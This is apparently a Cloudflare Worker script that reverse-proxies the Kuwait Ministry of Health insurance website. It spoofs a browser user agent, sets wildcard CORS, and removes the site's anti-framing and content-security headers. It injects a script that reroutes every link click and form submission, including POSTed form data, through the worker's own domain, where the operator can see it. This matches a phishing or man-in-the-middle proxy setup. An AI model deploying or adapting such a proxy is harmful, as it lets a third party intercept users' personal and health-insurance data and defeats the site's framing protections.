// Cloudflare Worker - Reverse Proxy for Kuwait MOH Insurance Site
const ALLOWED_ORIGIN = 'https://insonline.moh.gov.kw';

addEventListener('fetch', function(event) {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Handle CORS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
      }
    });
  }

  // Get target URL from query parameter or default
  var targetUrl = url.searchParams.get('url') || ALLOWED_ORIGIN + '/Insurance/logaction';

  // Security: only allow Kuwait MOH domain
  if (!targetUrl.startsWith(ALLOWED_ORIGIN)) {
    return new Response(JSON.stringify({ error: 'Only Kuwait MOH site is allowed' }), {
      status: 403,
      headers: { 'Content-Type': 'application/json' }
    });
  }

  try {
    var fetchOptions = {
      method: request.method,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
      },
      redirect: 'follow',
    };

    // Forward POST body
    if (request.method === 'POST') {
      fetchOptions.body = await request.text();
      fetchOptions.headers['Content-Type'] = request.headers.get('Content-Type') || 'application/x-www-form-urlencoded';
    }

    var response = await fetch(targetUrl, fetchOptions);
    var contentType = response.headers.get('Content-Type') || 'text/html';

    // Build response headers - strip X-Frame-Options and CSP
    var responseHeaders = new Headers();
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    responseHeaders.set('Access-Control-Allow-Headers', '*');
    responseHeaders.set('Content-Type', contentType);

    if (contentType.includes('text/html')) {
      var html = await response.text();
      var baseHref = ALLOWED_ORIGIN;
      var workerBase = url.origin;

      html = html.replace(/<head([^>]*)>/i, '<head$1>\n<base href="' + baseHref + '/">');

      var proxyScript = '<script>' +
        'document.addEventListener("click", function(e) {' +
        '  var link = e.target.closest("a[href]");' +
        '  if (link) {' +
        '    var href = link.getAttribute("href");' +
        '    if (href && !href.startsWith("javascript:") && !href.startsWith("#")) {' +
        '      e.preventDefault();' +
        '      var fullUrl;' +
        '      if (href.startsWith("http")) fullUrl = href;' +
        '      else if (href.startsWith("/")) fullUrl = "' + baseHref + '" + href;' +
        '      else fullUrl = "' + baseHref + '/" + href;' +
        '      if (fullUrl.includes("insonline.moh.gov.kw")) {' +
        '        window.location.href = "' + workerBase + '/?url=" + encodeURIComponent(fullUrl);' +
        '      }' +
        '    }' +
        '  }' +
        '}, true);' +
        'document.addEventListener("submit", function(e) {' +
        '  var form = e.target;' +
        '  if (form) {' +
        '    e.preventDefault();' +
        '    var action = form.getAttribute("action") || "";' +
        '    var fullUrl;' +
        '    if (action.startsWith("http")) fullUrl = action;' +
        '    else if (action.startsWith("/")) fullUrl = "' + baseHref + '" + action;' +
        '    else fullUrl = "' + baseHref + '/" + action;' +
        '    if (form.method && form.method.toLowerCase() === "post") {' +
        '      var fd = new FormData(form);' +
        '      fetch("' + workerBase + '/?url=" + encodeURIComponent(fullUrl), {' +
        '        method: "POST", body: new URLSearchParams(fd)' +
        '      }).then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();});' +
        '    } else {' +
        '      var p = new URLSearchParams(new FormData(form)).toString();' +
        '      window.location.href = "' + workerBase + '/?url=" + encodeURIComponent(fullUrl + "?" + p);' +
        '    }' +
        '  }' +
        '}, true);' +
        '</script>';

      html = html.replace('</body>', proxyScript + '\n</body>');

      return new Response(html, {
        status: response.status,
        headers: responseHeaders
      });
    } else {
      var body = await response.arrayBuffer();
      return new Response(body, {
        status: response.status,
        headers: responseHeaders
      });
    }
  } catch (error) {
    return new Response(JSON.stringify({
      error: 'Failed to fetch page',
      message: error.message
    }), {
      status: 502,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}
